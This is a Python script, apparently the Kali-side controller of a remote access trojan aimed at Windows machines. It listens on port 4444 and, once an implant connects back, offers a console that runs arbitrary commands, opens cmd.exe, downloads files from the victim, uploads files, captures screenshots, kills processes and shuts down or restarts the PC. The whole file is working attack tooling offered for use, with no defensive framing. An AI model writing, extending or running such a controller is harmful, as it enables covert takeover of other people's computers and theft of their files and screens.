#!/usr/bin/env python3
"""
SERVER FOR KALI - Управление Windows с Kali
Запуск: python3 server_kali_fixed.py
"""

import socket
import os
import sys
import time
from colorama import init, Fore, Back, Style

init(autoreset=True)

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
RESET = Style.RESET_ALL

PORT = 4444
BUFFER = 4096

class KaliServer:
    def __init__(self):
        self.client = None
        self.running = True
        self.current_dir = "C:\\"
    
    def banner(self):
        os.system('clear')
        print(f"""
{R}╔═══════════════════════════════════════════════════════════════╗
║     WINDOWS REMOTE CONTROLLER v1.0                            ║
║     [KALI LINUX] -> [WINDOWS]                                 ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
        """)
    
    def get_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    
    def start(self):
        self.banner()
        host = self.get_ip()
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', PORT))
        server.listen(1)
        
        print(f"{C}[*] Server started on {host}:{PORT}{RESET}")
        print(f"{Y}[!] Waiting for connection...{RESET}\n")
        
        self.client, addr = server.accept()
        print(f"{G}[+] CONNECTED! {addr}{RESET}\n")
        
        self.shell()
    
    def send_cmd(self, cmd):
        try:
            self.client.send(cmd.encode('utf-8'))
            response = self.client.recv(BUFFER).decode('utf-8', errors='ignore')
            return response
        except:
            return "[!] Connection error"
    
    def download_file(self, remote_path):
        filename = os.path.basename(remote_path)
        cmd = f"DOWNLOAD {remote_path}"
        self.client.send(cmd.encode('utf-8'))
        
        size_data = self.client.recv(BUFFER).decode()
        if size_data.startswith("FILE_SIZE:"):
            file_size = int(size_data.split(":")[1])
            self.client.send(b"READY")
            
            with open(filename, 'wb') as f:
                received = 0
                while received < file_size:
                    data = self.client.recv(BUFFER)
                    f.write(data)
                    received += len(data)
            
            print(f"{G}[+] File saved: {filename}{RESET}")
            return f"[+] Downloaded: {filename}"
        else:
            return size_data
    
    def upload_file(self, local_path, remote_path):
        if not os.path.exists(local_path):
            return f"[-] File not found: {local_path}"
        
        file_size = os.path.getsize(local_path)
        cmd = f"UPLOAD {remote_path} {file_size}"
        self.client.send(cmd.encode('utf-8'))
        
        time.sleep(0.5)
        with open(local_path, 'rb') as f:
            self.client.send(f.read())
        
        response = self.client.recv(BUFFER).decode()
        return response
    
    def take_screenshot(self):
        self.client.send(b"SCREENSHOT")
        time.sleep(2)
        
        size_data = self.client.recv(BUFFER).decode()
        if size_data.startswith("SCREEN_SIZE:"):
            file_size = int(size_data.split(":")[1])
            self.client.send(b"READY")
            
            with open("screenshot.png", 'wb') as f:
                received = 0
                while received < file_size:
                    data = self.client.recv(BUFFER)
                    f.write(data)
                    received += len(data)
            
            print(f"{G}[+] Screenshot saved: screenshot.png{RESET}")
            return "[+] Screenshot saved"
        else:
            return size_data
    
    def shell(self):
        print(f"{C}============================================================{RESET}")
        print(f"{G}[+] Windows Control Active{RESET}")
        print(f"{Y}Commands:{RESET}")
        print(f"  {C}cmd <command>{RESET}    - execute command")
        print(f"  {C}shell{RESET}            - start cmd.exe")
        print(f"  {C}download <file>{RESET}  - download file from Windows")
        print(f"  {C}upload <local> <remote>{RESET} - upload file")
        print(f"  {C}screenshot{RESET}       - take screenshot")
        print(f"  {C}ps{RESET}              - list processes")
        print(f"  {C}kill <PID>{RESET}       - kill process")
        print(f"  {C}msg <text>{RESET}       - show message")
        print(f"  {C}shutdown{RESET}         - shutdown PC")
        print(f"  {C}restart{RESET}          - restart PC")
        print(f"  {C}exit{RESET}             - close connection")
        print(f"{C}============================================================{RESET}\n")
        
        while self.running:
            try:
                cmd = input(f"{G}[KALI@{self.current_dir}]{RESET} > ").strip()
                
                if not cmd:
                    continue
                
                if cmd == "exit":
                    self.client.send(b"exit")
                    self.running = False
                    break
                
                elif cmd == "shell":
                    response = self.send_cmd("shell")
                    print(response)
                
                elif cmd == "screenshot":
                    response = self.take_screenshot()
                    print(response)
                
                elif cmd == "ps":
                    response = self.send_cmd("ps")
                    print(response)
                
                elif cmd.startswith("kill "):
                    pid = cmd.split()[1]
                    response = self.send_cmd(f"kill {pid}")
                    print(response)
                
                elif cmd.startswith("msg "):
                    msg = cmd[4:]
                    response = self.send_cmd(f"msg {msg}")
                    print(response)
                
                elif cmd == "shutdown":
                    confirm = input(f"{R}[!] Shutdown? (y/n): {RESET}")
                    if confirm.lower() == 'y':
                        response = self.send_cmd("shutdown")
                        print(response)
                
                elif cmd == "restart":
                    confirm = input(f"{R}[!] Restart? (y/n): {RESET}")
                    if confirm.lower() == 'y':
                        response = self.send_cmd("restart")
                        print(response)
                
                elif cmd.startswith("download "):
                    filepath = cmd[9:]
                    response = self.download_file(filepath)
                    print(response)
                
                elif cmd.startswith("upload "):
                    parts = cmd.split()
                    if len(parts) >= 3:
                        local = parts[1]
                        remote = parts[2]
                        response = self.upload_file(local, remote)
                        print(response)
                    else:
                        print("[-] Usage: upload <local_file> <remote_path>")
                
                elif cmd.startswith("cmd "):
                    command = cmd[4:]
                    response = self.send_cmd(f"cmd {command}")
                    print(response)
                
                elif cmd.startswith("cd "):
                    self.current_dir = cmd[3:]
                    response = self.send_cmd(f"cd {self.current_dir}")
                    print(response)
                
                else:
                    response = self.send_cmd(f"cmd {cmd}")
                    print(response)
                    
            except KeyboardInterrupt:
                print(f"\n{Y}[!] Interrupted{RESET}")
                self.running = False
                break
            except Exception as e:
                print(f"{R}[-] Error: {e}{RESET}")
        
        self.client.close()
        print(f"{G}[+] Connection closed{RESET}")

if __name__ == "__main__":
    server = KaliServer()
    server.start()